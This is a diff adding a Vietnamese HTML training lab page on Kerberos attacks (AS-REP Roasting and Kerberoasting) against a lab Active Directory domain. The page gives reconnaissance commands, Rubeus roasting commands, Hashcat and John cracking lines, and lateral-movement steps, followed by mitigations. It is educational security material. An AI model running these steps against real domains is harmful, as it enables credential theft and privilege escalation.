@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 2 - Workstation01: Kerberos Attack</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+
+        .difficulty-badge {
+            background: #e74c3c;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        .content-section {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+
+        .section-title {
+            color: #2c3e50;
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 10px;
+        }
+
+        .objective-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .objective-list li {
+            padding: 10px 0;
+            padding-left: 30px;
+            position: relative;
+            border-bottom: 1px solid #eee;
+        }
+
+        .objective-list li:before {
+            content: "🎯";
+            position: absolute;
+            left: 0;
+            font-size: 1.2rem;
+        }
+
+        .scenario-box {
+            background: linear-gradient(45deg, #e74c3c 0%, #c0392b 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .scenario-box h3 {
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+        }
+
+        .attack-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .step-card {
+            background: #f8f9fa;
+            border: 2px solid #667eea;
+            border-radius: 10px;
+            padding: 20px;
+            transition: transform 0.3s ease;
+        }
+
+        .step-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.2);
+        }
+
+        .step-number {
+            background: #667eea;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+        }
+
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            overflow-x: auto;
+            margin: 15px 0;
+            border-left: 4px solid #667eea;
+        }
+
+        .payload-example {
+            background: #fff5f5;
+            border: 2px solid #e53e3e;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .payload-example h4 {
+            color: #e53e3e;
+            margin-bottom: 10px;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .warning-box h4 {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+
+        .topology-section {
+            background: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .topology-item {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            padding: 15px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .topology-icon {
+            font-size: 2rem;
+            margin-right: 15px;
+        }
+
+        .attack-technique {
+            background: linear-gradient(45deg, #8e44ad 0%, #9b59b6 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .attack-technique h3 {
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+        }
+
+        .result-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        .result-table th,
+        .result-table td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+
+        .result-table th {
+            background: #667eea;
+            color: white;
+        }
+
+        .result-table tr:nth-child(even) {
+            background: #f2f2f2;
+        }
+
+        .mitigation-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .mitigation-card {
+            background: #f0f8ff;
+            border-left: 4px solid #4a90e2;
+            padding: 20px;
+            border-radius: 8px;
+        }
+
+        .mitigation-card h4 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+
+        .lab-actions {
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .action-button {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: bold;
+            margin: 10px;
+            transition: all 0.3s ease;
+            font-size: 1.1rem;
+        }
+
+        .action-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .back-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            text-decoration: none;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background: rgba(255,255,255,0.3);
+        }
+
+        .assumptions-box {
+            background: #e8f4fd;
+            border: 2px solid #3498db;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .assumptions-box h4 {
+            color: #2980b9;
+            margin-bottom: 15px;
+        }
+
+        .assumptions-box ul {
+            list-style-type: disc;
+            padding-left: 20px;
+        }
+
+        .assumptions-box li {
+            margin-bottom: 8px;
+        }
+
+        .command-output {
+            background: #1a1a1a;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            margin: 15px 0;
+            border: 2px solid #333;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .attack-steps {
+                grid-template-columns: 1fr;
+            }
+            
+            .mitigation-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <a href="/labs" class="back-btn">← Quay lại Labs</a>
+    
+    <div class="container">
+        <div class="header">
+            <h1>🏢 Lab 2 - Workstation01</h1>
+            <p class="subtitle">Kerberos Attack: AS-REP Roasting & Kerberoasting</p>
+            <div class="difficulty-badge">INTERMEDIATE</div>
+        </div>
+
+        <!-- Tổng quan Lab -->
+        <div class="content-section">
+            <h2 class="section-title">📋 Tổng quan Lab</h2>
+            <div class="scenario-box">
+                <h3>🎯 Kịch bản tấn công</h3>
+                <p>Kịch bản mô phỏng quá trình khai thác khi tài khoản <strong>studentA</strong> đã bị chiếm quyền và được sử dụng để đăng nhập vào máy trạm <strong>Workstation01</strong> trong domain. Kẻ tấn công tiến hành thu thập thông tin và khai thác các điểm yếu trong cơ chế xác thực của Active Directory nhằm leo thang đặc quyền và mở rộng quyền kiểm soát hệ thống.</p>
+            </div>
+            
+            <h3>🎯 Mục tiêu học tập</h3>
+            <ul class="objective-list">
+                <li>Hiểu về cấu trúc và hoạt động của Active Directory Domain</li>
+                <li>Học cách thu thập thông tin domain từ máy trạm đã bị chiếm quyền</li>
+                <li>Thực hành kỹ thuật AS-REP Roasting để khai thác tài khoản không yêu cầu pre-authentication</li>
+                <li>Thực hành kỹ thuật Kerberoasting để khai thác tài khoản có SPN</li>
+                <li>Phân tích tác động và đề xuất biện pháp phòng ngừa</li>
+            </ul>
+        </div>
+
+        <!-- Mô hình triển khai -->
+        <div class="content-section">
+            <h2 class="section-title">🏗️ Mô hình triển khai</h2>
+            <div class="topology-section">
+                <div class="topology-item">
+                    <div class="topology-icon">💻</div>
+                    <div>
+                        <strong>Workstation01</strong><br>
+                        Máy Windows 11 nội bộ đã bị chiếm quyền, điểm khởi đầu của tấn công
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">👤</div>
+                    <div>
+                        <strong>studentA (Tài khoản hiện tại)</strong><br>
+                        Tài khoản người dùng thường xuyên sử dụng máy này, attacker có quyền tương đương
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">🏛️</div>
+                    <div>
+                        <strong>SVR-AD01 (Domain Controller)</strong><br>
+                        Domain Controller chính của domain iris.com.vn, cung cấp dịch vụ Kerberos
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">🎯</div>
+                    <div>
+                        <strong>soict_hungpn (Target 1)</strong><br>
+                        Tài khoản teacher có SPN, mục tiêu của Kerberoasting
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">🎯</div>
+                    <div>
+                        <strong>studentB (Target 2)</strong><br>
+                        Tài khoản student không yêu cầu pre-authentication, mục tiêu của AS-REP Roasting
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Các giả định -->
+        <div class="content-section">
+            <h2 class="section-title">⚙️ Các giả định trong mô hình</h2>
+            <div class="assumptions-box">
+                <h4>📝 Các điều kiện tiền đề:</h4>
+                <ul>
+                    <li>Attacker đã chiếm được quyền truy cập Workstation01 với quyền tương đương studentA</li>
+                    <li>Máy Workstation01 đã join domain iris.com.vn và có thể giao tiếp với DC</li>
+                    <li>Tài khoản studentB được cấu hình "Do not require Kerberos preauthentication"</li>
+                    <li>Tài khoản soict_hungpn có ít nhất một Service Principal Name (SPN) được gán</li>
+                    <li>Domain Controller không bật tính năng tự động khóa tài khoản sau nhiều lần thất bại</li>
+                    <li>Attacker được phép tải và thực thi công cụ tấn công (Rubeus.exe) trên máy trạm</li>
+                    <li>Không có firewall chặn việc gửi yêu cầu Kerberos từ Workstation01 đến DC</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Các bước thực hiện -->
+        <div class="content-section">
+            <h2 class="section-title">⚡ Các bước thực hiện chi tiết</h2>
+            
+            <div class="attack-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3>Thu thập thông tin Domain</h3>
+                    <p>Thực hiện reconnaissance để lấy thông tin về Domain Controller và các nhóm người dùng.</p>
+                    <div class="code-block">
+# Liệt kê Domain Controller
+nltest /dclist:iris.com.vn
+
+# Liệt kê các group trong domain
+net group /domain
+
+# Xem thông tin group của user hiện tại
+whoami /groups
+                    </div>
+                    <div class="command-output">
+C:\> nltest /dclist:iris.com.vn
+Get list of DCs in domain 'iris.com.vn' from '\\SVR-AD01'.
+    SVR-AD01.iris.com.vn [PDC]
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3>Thực hiện AS-REP Roasting</h3>
+                    <p>Khai thác tài khoản studentB có cấu hình không yêu cầu Kerberos pre-authentication.</p>
+                    <div class="attack-technique">
+                        <h3>🔥 Kỹ thuật AS-REP Roasting</h3>
+                        <p>Tấn công các tài khoản có thuộc tính "Do not require Kerberos preauthentication" để lấy hash và crack offline.</p>
+                    </div>
+                    <div class="code-block">
+# Dùng Rubeus để tìm và trích xuất hash
+.\Rubeus.exe asreproast
+
+# Kết quả sẽ trả về hash dạng:
+# $krb5asrep$23$studentB@IRIS.COM.VN:...
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3>Thực hiện Kerberoasting</h3>
+                    <p>Khai thác tài khoản soict_hungpn có SPN để yêu cầu vé dịch vụ và thu thập hash.</p>
+                    <div class="attack-technique">
+                        <h3>🎫 Kỹ thuật Kerberoasting</h3>
+                        <p>Yêu cầu vé dịch vụ (TGS) cho các tài khoản có SPN, sau đó trích xuất hash để crack offline.</p>
+                    </div>
+                    <div class="code-block">
+# Dùng Rubeus để thực hiện Kerberoasting
+.\Rubeus.exe kerberoast
+
+# Kết quả sẽ trả về hash dạng:
+# $krb5tgs$23$*soict_hungpn$IRIS.COM.VN$...
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3>Crack Hash Offline</h3>
+                    <p>Sử dụng John the Ripper hoặc Hashcat để crack các hash đã thu thập được.</p>
+                    <div class="code-block">
+# Sử dụng John the Ripper
+john --wordlist=rockyou.txt hash.txt
+
+# Hoặc sử dụng Hashcat
+hashcat -m 18200 hash.txt rockyou.txt  # AS-REP
+hashcat -m 13100 hash.txt rockyou.txt  # Kerberoast
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3>Phân tích kết quả</h3>
+                    <p>Đánh giá mức độ thành công của cuộc tấn công và khả năng leo thang đặc quyền.</p>
+                    <div class="warning-box">
+                        <h4>⚠️ Mức độ nghiêm trọng: CAO</h4>
+                        <p>Thu được mật khẩu của các tài khoản có quyền cao hơn, tạo điều kiện leo thang đặc quyền và lateral movement.</p>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">6</div>
+                    <h3>Lateral Movement</h3>
+                    <p>Sử dụng thông tin đăng nhập thu được để di chuyển ngang trong mạng và chuẩn bị tấn công DC.</p>
+                    <div class="payload-example">
+                        <h4>Các hành động tiếp theo:</h4>
+                        <ul>
+                            <li>Đăng nhập với tài khoản studentB hoặc soict_hungpn</li>
+                            <li>Khám phá thêm tài nguyên mạng với quyền mới</li>
+                            <li>Chuẩn bị cho cuộc tấn công Domain Controller</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Kết quả mong đợi -->
+        <div class="content-section">
+            <h2 class="section-title">📊 Kết quả khai thác</h2>
+            <table class="result-table">
+                <thead>
+                    <tr>
+                        <th>Kỹ thuật</th>
+                        <th>Tài khoản bị thu thập</th>
+                        <th>Trạng thái</th>
+                        <th>Mức độ nguy hiểm</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>AS-REP Roasting</td>
+                        <td>studentB</td>
+                        <td>Thu thập và crack thành công</td>
+                        <td>Trung bình</td>
+                    </tr>
+                    <tr>
+                        <td>Kerberoasting</td>
+                        <td>soict_hungpn</td>
+                        <td>Thu thập và crack thành công</td>
+                        <td>Cao</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Biện pháp khắc phục -->
+        <div class="content-section">
+            <h2 class="section-title">🛡️ Biện pháp khắc phục và phòng ngừa</h2>
+            <div class="mitigation-grid">
+                <div class="mitigation-card">
+                    <h4>🔒 Hạn chế AS-REP Roasting</h4>
+                    <ul>
+                        <li>Bắt buộc pre-authentication cho toàn bộ người dùng</li>
+                        <li>Kiểm tra định kỳ bằng PowerShell: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code></li>
+                        <li>Thiết lập giới hạn đăng nhập cho tài khoản thông thường</li>
+                        <li>Sử dụng hệ thống cảnh báo khi có truy vấn KDC bất thường</li>
+                    </ul>
+                </div>
+                <div class="mitigation-card">
+                    <h4>🎫 Ngăn chặn Kerberoasting</h4>
+                    <ul>
+                        <li>Không gán SPN không cần thiết cho tài khoản người dùng</li>
+                        <li>Sử dụng managed service account (gMSA) có mật khẩu tự động xoay vòng</li>
+                        <li>Đặt mật khẩu mạnh, dài và phức tạp cho tài khoản có SPN</li>
+                        <li>Theo dõi log 4769 (Kerberos Service Ticket Request)</li>
+                    </ul>
+                </div>
+                <div class="mitigation-card">
+                    <h4>👁️ Giám sát và phát hiện</h4>
+                    <ul>
+                        <li>Thiết lập SIEM để phát hiện các pattern tấn công Kerberos</li>
+                        <li>Giám sát các yêu cầu TGS/TGT bất thường</li>
+                        <li>Cảnh báo khi có nhiều yêu cầu vé từ cùng một source</li>
+                        <li>Áp dụng đăng nhập 2 yếu tố (MFA) cho tài khoản đặc biệt</li>
+                    </ul>
+                </div>
+                <div class="mitigation-card">
+                    <h4>🔐 Chính sách bảo mật</h4>
+                    <ul>
+                        <li>Áp dụng chính sách mật khẩu mạnh cho toàn domain</li>
+                        <li>Thường xuyên audit cấu hình tài khoản người dùng</li>
+                        <li>Phân quyền theo nguyên tắc least privilege</li>
+                        <li>Đào tạo nhận thức bảo mật cho người dùng</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Hành động -->
+        <div class="lab-actions">
+            <a href="#" class="action-button">
+                🚀 Bắt đầu thực hành
+            </a>
+            <a href="/labs" class="action-button" style="background: linear-gradient(45deg, #6c757d, #495057);">
+                📚 Quay lại Labs
+            </a>
+        </div>
+
+        <div style="text-align: center; margin-top: 40px; color: white;">
+            <p style="opacity: 0.8;">
+                ⚠️ Lab này chỉ dành cho mục đích học tập và nghiên cứu bảo mật trong môi trường kiểm soát
+            </p>
+        </div>
+    </div>
+</body>
+</html>
